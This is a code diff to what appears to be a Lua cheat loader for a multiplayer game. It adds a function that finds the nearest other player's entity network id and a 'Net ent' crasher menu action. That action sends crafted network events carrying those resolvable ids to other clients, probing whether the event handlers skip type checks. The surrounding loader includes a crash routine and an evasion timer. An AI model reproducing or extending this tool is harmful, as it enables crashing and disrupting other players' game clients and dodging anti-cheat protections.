@@ -23493,7 +23493,7 @@ local NET = (function(O, C)
         return spec
     end
 
-    function NET.evSend(id, fill)
+    function NET.evSend(id, fill, first)
         id = tonumber(id) or 0
         local ids = crashIds(200.0)
         if #ids == 0 then
@@ -23509,13 +23509,70 @@ local NET = (function(O, C)
             O.log("net ev: no width table for id %d", id)
             return false
         end
+        if first then spec[1].val = tonumber(first) or 0 end
         local data = NET.bits(spec)
         if type(data) ~= "table" then return false end
         local list = {}
         for i = 1, #ids do list[i] = tostring(ids[i]) end
-        O.log("net ev: id %d (%s) fill 0x%02X %d bytes -> %d [%s]",
-              id, NET.NAMES[id] or "?", fill & 0xFF, #data, #ids, table.concat(list, ","))
+        O.log("net ev: id %d (%s) fill 0x%02X first %s %d bytes -> %d [%s]",
+              id, NET.NAMES[id] or "?", fill & 0xFF,
+              first and tostring(first) or "-", #data, #ids, table.concat(list, ","))
         return NET.emitEvent(ids, NET.EV[id], id, data)
+    end
+
+    -- Nearest other player's entity, as a network id.
+    --
+    -- The handlers resolve their leading 13-bit field through the same network
+    -- object table this client uses, so a value invented on the wire simply
+    -- fails the lookup and the handler returns without doing anything. That is
+    -- exactly what the 0xFF fills did: every field at its ceiling, no entity
+    -- behind the id, no effect. To reach the body of a handler the id has to
+    -- be one this client can see, which means asking the game for it.
+    --
+    -- Every call is wrapped: a native that is missing or that throws must not
+    -- take the loader down, and the caller only ever sees nil.
+    function NET.nearestNet(kind)
+        local okP, me = pcall(PlayerId)
+        if not okP then return nil end
+        local okPed, myPed = pcall(PlayerPedId)
+        if not okPed or not myPed or myPed == 0 then return nil end
+        local okC, pc = pcall(GetEntityCoords, myPed)
+        if not okC or not pc then return nil end
+        local px = pc.x or pc[1] or 0.0
+        local py = pc.y or pc[2] or 0.0
+        local pz = pc.z or pc[3] or 0.0
+        local okL, list = pcall(GetActivePlayers)
+        if not okL or type(list) ~= "table" then return nil end
+        local best, bestD = 0, 250.0
+        for i = 1, #list do
+            local p = list[i]
+            if p ~= me then
+                local okp, ped = pcall(GetPlayerPed, p)
+                if okp and ped and ped ~= 0 then
+                    local ent = 0
+                    if kind == "vehicle" then
+                        local okv, veh = pcall(GetVehiclePedIsIn, ped, false)
+                        if okv and veh and veh ~= 0 then ent = veh end
+                    else
+                        ent = ped
+                    end
+                    if ent ~= 0 then
+                        local okc, c = pcall(GetEntityCoords, ent)
+                        if okc and c then
+                            local dx = (c.x or c[1] or 0.0) - px
+                            local dy = (c.y or c[2] or 0.0) - py
+                            local dz = (c.z or c[3] or 0.0) - pz
+                            local d = math.sqrt(dx * dx + dy * dy + dz * dz)
+                            if d < bestD then bestD, best = d, ent end
+                        end
+                    end
+                end
+            end
+        end
+        if best == 0 then return nil end
+        local okn, nid = pcall(NetworkGetNetworkIdFromEntity, best)
+        if not okn or type(nid) ~= "number" or nid <= 0 then return nil end
+        return nid, bestD
     end
 
     function NET.crash()
@@ -25145,7 +25202,7 @@ function A.boot()
 
     if A._booted then return end
     A._booted = true
-    O.log("loader build 2026-10-29-r18 (names, width table, ev sender)")
+    O.log("loader build 2026-10-29-r19 (resolvable entity ids)")
     O.log("protection defaults: anti-freeze, anti-attach, anti-spectate, ped guard armed")
     O.every("evasion", 900, A.tick, 350)
     O.every("pedGuardWatch", 100, A.pedGuardWatch, 0)
@@ -32613,6 +32670,30 @@ local function installCrasher()
                 NET.evIdx = ((NET.evIdx or 0) % #seq) + 1
                 NET.evFill = (NET.evFill == 0xFF) and 0 or 0xFF
                 NET.evSend(seq[NET.evIdx], NET.evFill)
+            end,
+        },
+        {
+            -- Same four events with a leading field that actually resolves:
+            -- 66 wants a vehicle id, 15 wants a vehicle id, 27 wants a door
+            -- id. Two of the four deliberately hand a ped id to a vehicle
+            -- slot and the reverse, which is the only way to find out whether
+            -- the handler checks the object type before using it.
+            name = "Net ent",
+            type = "action",
+            onClick = function()
+                NET.entVar = ((NET.entVar or 0) % 4) + 1
+                local v = NET.entVar
+                local id = ({ 66, 66, 15, 27 })[v]
+                local kind = (v == 1 or v == 3) and "vehicle" or "ped"
+                local fill = (v <= 2) and 0xFF or 0x00
+                local nid, dist = NET.nearestNet(kind)
+                if not nid then
+                    O.log("net ent: no %s nearby", kind)
+                    return
+                end
+                O.log("net ent: v%d %s net id %d at %.1f m",
+                      v, kind, nid, tonumber(dist) or -1)
+                NET.evSend(id, fill, nid)
             end,
         },
     }
